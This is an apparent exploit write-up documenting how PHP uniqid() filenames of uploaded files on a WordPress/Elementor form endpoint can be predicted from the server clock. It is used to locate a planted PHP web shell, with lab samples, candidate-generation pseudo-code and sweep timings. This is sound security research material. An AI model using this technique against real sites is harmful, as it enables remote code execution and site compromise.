# analysis.md — uniqid() → filename mapping

The uploaded payload is stored as `<uniqid()>.php`. Recovering that filename remotely is
the second half of the exploit. This document shows exactly how PHP's `uniqid()` maps to
the observed filenames, with real samples from the lab.

## PHP uniqid() internals

`uniqid()` (without arguments) returns the current time as a 13-character hex string:

```
uniqid() = sprintf("%08x%05x", sec, usec)
           ├── sec = floor(microtime(true))        ── Unix seconds
           └── usec = fractional part * 1_000_000  ── microseconds (0..999999)
```

So the value is **fully determined by the server clock** — no randomness. The seconds
part is readable from any HTTP response `Date` header; only the microsecond spread must
be swept.

## Observed mapping (real lab runs, ARM64 Docker lab)

| # | uniqid hex | split (sec / usec) | UTC time of upload |
|---|---|---|---|
| 1 | `6a8cc642de7cc` | `6a8cc642` = 1787610690 · `de7cc` = 911308 µs | 2026-08-24 22:31:30 |
| 2 | `6a8ce45cdf67f` | `6a8ce45c` = 1787615324 · `df67f` = 915071 µs | 2026-08-25 00:39:56 |
| 3 | `6a8ce4ab75d67` | `6a8ce4ab` = 1787615371 · `75d67` = 482663 µs | 2026-08-25 00:41:15 |
| 4 | `6a8cea1a1c44f` | `6a8cea1a` = 1787618458 · `1c44f` = 115791 µs | 2026-08-25 01:04:26 |
| 5 | `6a8ceb04660c9` | `6a8ceb04` = 1787618572 · `660c9` = 417993 µs | 2026-08-25 01:08:20 |
| 6 | `6a8cebf002529` | `6a8cebf0` = 1787618776 · `02529` = 9513 µs   | 2026-08-25 01:12:16 |

Each row was verified by decoding the filename and comparing against the container clock
(`docker exec wp-lab date`) at the time of upload — every sample matches the server clock
at the moment the file was written.

## Candidate generation used by the PoC

```text
server_sec      ← HTTP Date header of the target (or local clock in a lab)
t_upload        ← local time right before the multipart POST is sent

sec part        = int(t_upload)                       (matches server_sec ± small skew)
usec part       = sweep from (send-time µs − window) to (+window), step --step-us
candidate       = format(sec*1e6 + usec, 'x') + ".php"
probe URL       = base + "/wp-content/uploads/elementor/forms/" + YYYY/MM + "/" + candidate
```

The PoC probes candidates concurrently and stops at the first URL returning the shell
marker (`POC-RCE-OK`).

## Sweep sizing

| Window (`--probe-seconds`) | Candidates (step=2 ms) | Approx. time @13 req/s |
|---|---|---|
| 0.05 s (default) | ~3,600 | ~5 min |
| 0.2 s | ~14,000 | ~18 min |
| 1.0 s | ~71,000 | ~90 min |

On fast networks raise `--workers`; on slow links keep the default window — in practice
the upload processing happens within ~100–400 ms of the request being sent, so a small
centered window usually hits.
